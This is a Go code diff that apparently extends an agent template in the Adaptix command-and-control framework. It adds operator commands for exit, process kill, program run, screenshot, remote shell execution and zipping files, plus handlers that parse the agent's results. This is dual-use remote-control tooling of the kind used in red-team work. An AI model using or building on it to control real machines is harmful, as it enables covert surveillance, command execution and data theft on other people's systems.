@@ -988,6 +988,52 @@ func (ext *__NAME_CAP__Extender) CreateCommand(agentData adaptix.AgentData, args
 		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
 		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}
 
+	case "exit":
+		array = []interface{}{COMMAND_EXIT}
+
+	case "kill":
+		var pid float64
+		pid, err = getFloatArg(args, "pid")
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{COMMAND_KILL, int(pid)}
+
+	case "run":
+		taskData.Type = adaptix.TASK_TYPE_JOB
+
+		var program string
+		program, err = getStringArg(args, "program")
+		if err != nil {
+			goto RET
+		}
+		programArgs, _ := args["args"].(string)
+		programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)
+		array = []interface{}{COMMAND_RUN, Ts.TsConvertUTF8toCp(program, agentData.ACP), programArgs}
+
+	case "screenshot":
+		array = []interface{}{COMMAND_SCREENSHOT}
+
+	case "shell":
+		var cmdStr string
+		cmdStr, err = getStringArg(args, "cmd")
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{COMMAND_SHELL, Ts.TsConvertUTF8toCp(cmdStr, agentData.ACP)}
+
+	case "zip":
+		var path, zipPath string
+		path, err = getStringArg(args, "path")
+		if err != nil {
+			goto RET
+		}
+		zipPath, err = getStringArg(args, "zip_path")
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{COMMAND_ZIP, Ts.TsConvertUTF8toCp(path, agentData.ACP), Ts.TsConvertUTF8toCp(zipPath, agentData.ACP)}
+
 	default:
 		err = fmt.Errorf("Command '%v' not found", command)
 		goto RET
@@ -1905,6 +1951,61 @@ func (ext *__NAME_CAP__Extender) ProcessData(agentData adaptix.AgentData, decryp
 		case COMMAND_UPLOAD:
 			task.Message = "File successfully uploaded"
 			Ts.TsClientGuiFilesStatus(task)
+
+		case COMMAND_EXIT:
+			task.Message = "The agent has completed its work (kill process)"
+			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)
+
+		case COMMAND_KILL:
+			if !packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			pid := packer.ParseInt32()
+			task.Message = fmt.Sprintf("Process %d killed", pid)
+
+		case COMMAND_RUN:
+			if !packer.CheckPacker([]string{"int", "byte", "array"}) {
+				goto HANDLER
+			}
+			pid := packer.ParseInt32()
+			isOutput := packer.ParseInt8()
+			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+
+			status := "no output"
+			if isOutput > 0 {
+				status = "with output"
+			}
+
+			task.Completed = false
+			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)
+
+		case COMMAND_SCREENSHOT:
+			if !packer.CheckPacker([]string{"array"}) {
+				goto HANDLER
+			}
+			screenData := packer.ParseBytes()
+			_ = Ts.TsScreenshotAdd(agentData.Id, "", screenData)
+			task.Message = "Screenshot saved"
+
+		case COMMAND_SHELL:
+			if !packer.CheckPacker([]string{"array"}) {
+				goto HANDLER
+			}
+			output := packer.ParseString()
+			task.Message = "Command output:"
+			if agentData.Os == adaptix.OS_WINDOWS {
+				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)
+			} else {
+				task.ClearText = output
+			}
+
+		case COMMAND_ZIP:
+			if !packer.CheckPacker([]string{"array"}) {
+				goto HANDLER
+			}
+			zipPath := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+			task.Message = fmt.Sprintf("Archive '%s' successfully created", zipPath)
+			task.MessageType = adaptix.MESSAGE_SUCCESS
 
 		case COMMAND_ERROR:
 			if !packer.CheckPacker([]string{"int"}) {
